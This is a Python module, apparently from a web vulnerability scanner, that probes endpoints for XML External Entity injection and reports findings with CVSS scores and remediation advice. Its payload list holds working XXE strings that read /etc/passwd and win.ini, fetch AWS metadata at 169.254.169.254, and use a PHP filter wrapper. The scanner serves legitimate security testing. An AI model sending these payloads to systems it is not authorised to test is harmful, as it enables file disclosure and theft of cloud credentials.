"""
MulikaScans — XXE (XML External Entity) Injection Detection Module

Detects XXE vulnerabilities in endpoints that accept XML input.
Tests both reflected (error-based) and blind XXE patterns.
"""

import requests
from urllib.parse import urlparse, parse_qs

# ── XXE Payloads ──────────────────────────────────────────────────────────────
# Each: (payload, signature_to_look_for, description)
XXE_PAYLOADS = [
    # Classic file read — Linux
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        "root:x:",
        "Linux /etc/passwd read",
    ),
    # Classic file read — Windows
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>',
        "[fonts]",
        "Windows win.ini read",
    ),
    # Error-based XXE (invalid URI to provoke error disclosure)
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///xxe-test-invalid-path-mulikascans">]><root>&xxe;</root>',
        "xxe-test-invalid-path",
        "Error-based XXE path disclosure",
    ),
    # SSRF via XXE — HTTP fetch canary
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
        "ami-id",
        "XXE SSRF to AWS metadata",
    ),
    # Billion laughs DoS canary (safe — only 3 levels)
    (
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY a "xxe-dos-canary"><!ENTITY b "&a;&a;&a;">]><root>&b;</root>',
        "xxe-dos-canary",
        "Entity expansion reflected",
    ),
    # PHP filter wrapper (common in PHP apps)
    (
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>',
        "cm9vd",  # base64 prefix of "root"
        "PHP filter wrapper XXE",
    ),
]

# Error signatures that indicate XML parsing / XXE-related errors
ERROR_SIGNATURES = [
    "xml parsing",
    "xmlparseexception",
    "xml.etree",
    "lxml",
    "simplexml",
    "xerces",
    "xml parse error",
    "sax parse",
    "entity was not found",
    "external entity",
    "no external entity",
    "dtd is not allowed",
    "document type declaration",
    "javax.xml",
    "org.xml.sax",
    "system identifier",
    "file not found",
    "xxe",
]

# Content types that suggest XML is accepted
XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/xhtml+xml",
    "application/soap+xml",
    "application/rss+xml",
    "application/atom+xml",
]

_HEADERS = {
    "User-Agent": "MulikaScans/1.0 (Security Scanner)",
    "Content-Type": "application/xml",
    "Accept": "application/xml, text/xml, */*",
}


def _xml_accepting_endpoints(target_url, session, timeout):
    """Return list of endpoints that accept XML (by probing Content-Type)."""
    endpoints = []
    parsed = urlparse(target_url)

    # Check if the base URL responds to XML POST
    try:
        probe = session.post(
            target_url,
            data='<?xml version="1.0"?><test/>',
            headers=_HEADERS,
            timeout=timeout,
            verify=False,
            allow_redirects=False,
        )
        ct = probe.headers.get("Content-Type", "")
        # Anything that isn't a pure HTML response may process XML
        if probe.status_code in (200, 400, 422, 500) and "text/html" not in ct:
            endpoints.append(target_url)
        # Also include if server returns XML error (still processes it)
        if any(s in probe.text.lower() for s in ["xml", "parse", "entity"]):
            if target_url not in endpoints:
                endpoints.append(target_url)
    except Exception:
        pass

    # Also try common XML API paths
    base = f"{parsed.scheme}://{parsed.netloc}"
    for path in ["/api", "/api/v1", "/ws", "/service", "/soap", "/xml"]:
        candidate = base + path
        if candidate != target_url:
            try:
                r = session.post(
                    candidate,
                    data='<?xml version="1.0"?><test/>',
                    headers=_HEADERS,
                    timeout=max(timeout - 2, 3),
                    verify=False,
                    allow_redirects=False,
                )
                if r.status_code not in (403, 404, 405):
                    endpoints.append(candidate)
            except Exception:
                pass

    return endpoints


def check_xxe(target_url, timeout=8, session=None):
    """
    Test target URL for XML External Entity (XXE) injection vulnerabilities.

    Returns a list of finding dicts compatible with the scanner engine format.
    """
    _req = session if session is not None else requests
    findings = []

    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    # First probe: check if the endpoint accepts XML at all
    endpoints = _xml_accepting_endpoints(target_url, _req, timeout)

    # Even if no XML endpoint found, try the target URL directly —
    # some APIs process XML silently.
    if not endpoints:
        endpoints = [target_url]

    seen = set()

    for endpoint in endpoints:
        for payload, signature, description in XXE_PAYLOADS:
            if (endpoint, signature) in seen:
                continue
            try:
                resp = _req.post(
                    endpoint,
                    data=payload,
                    headers=_HEADERS,
                    timeout=timeout,
                    verify=False,
                    allow_redirects=False,
                )
                body = resp.text

                # Check for direct content reflection (successful file read)
                if signature and signature in body:
                    seen.add((endpoint, signature))
                    findings.append({
                        "name": "XML External Entity (XXE) Injection",
                        "severity": "critical",
                        "cvss_score": 9.1,
                        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L",
                        "category": "xxe",
                        "cwe_id": "CWE-611",
                        "owasp_category": "A05:2021",
                        "url_affected": endpoint,
                        "parameter": "XML body",
                        "detail": (
                            f"The endpoint processes XML input and resolved an external entity, "
                            f"allowing file read or SSRF. Payload triggered: {description}. "
                            f"Signature found in response: '{signature[:40]}'"
                        ),
                        "evidence": f"Response contained: {signature[:80]}",
                        "request_data": payload[:300],
                        "response_data": body[:500],
                        "remediation": (
                            "Disable DTD (Document Type Definition) processing and external entity "
                            "resolution in your XML parser. In Python: use defusedxml. In Java: "
                            "set XMLConstants.FEATURE_SECURE_PROCESSING to true and disable "
                            "http://xml.org/sax/features/external-general-entities. Never allow "
                            "user-supplied XML to be parsed with DTDs enabled."
                        ),
                        "references": [
                            "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                            "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html",
                            "https://cwe.mitre.org/data/definitions/611.html",
                        ],
                    })
                    break  # One confirmed finding per endpoint is enough

                # Check for error-based disclosure (XML parser errors leak path info)
                body_lower = body.lower()
                for sig in ERROR_SIGNATURES:
                    if sig in body_lower and (endpoint, "error") not in seen:
                        seen.add((endpoint, "error"))
                        findings.append({
                            "name": "XML Parser Error Disclosure (Potential XXE)",
                            "severity": "medium",
                            "cvss_score": 5.3,
                            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
                            "category": "xxe",
                            "cwe_id": "CWE-611",
                            "owasp_category": "A05:2021",
                            "url_affected": endpoint,
                            "parameter": "XML body",
                            "detail": (
                                f"The endpoint appears to process XML and returned an error message "
                                f"indicating XML parsing is active ('{sig}' found in response). "
                                f"Manual testing for XXE is recommended."
                            ),
                            "evidence": f"XML error indicator '{sig}' found in response",
                            "request_data": payload[:300],
                            "response_data": body[:300],
                            "remediation": (
                                "Disable DTD processing in your XML parser and suppress verbose "
                                "XML error messages in production responses."
                            ),
                            "references": [
                                "https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
                            ],
                        })
                        break

            except Exception:
                continue

    return findings
